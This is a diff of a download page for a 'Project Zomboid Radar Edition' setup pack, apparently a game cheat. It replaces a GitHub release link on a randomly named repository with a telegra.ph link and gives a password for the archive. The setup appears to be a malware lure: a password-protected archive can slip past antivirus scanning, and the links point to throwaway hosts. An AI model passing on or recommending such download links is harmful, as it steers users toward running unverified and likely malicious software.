@@ -7,7 +7,7 @@ Project Zomboid Radar Edition setup pack — installer, configuration presets, p
 ******************** DOWNLOAD ********************
 --------------------------------------------------
 
-[+] [DOWNLOAD LINK](https://github.com/PoltergeistCardinal/ogynhzab/releases/download/Release/Setup.zip)
+[+] [DOWNLOAD LINK](https://telegra.ph/Download-05-21-39)
 [+] ARCHIVE PASSWORD: `1847`
 
 --------------------------------------------------
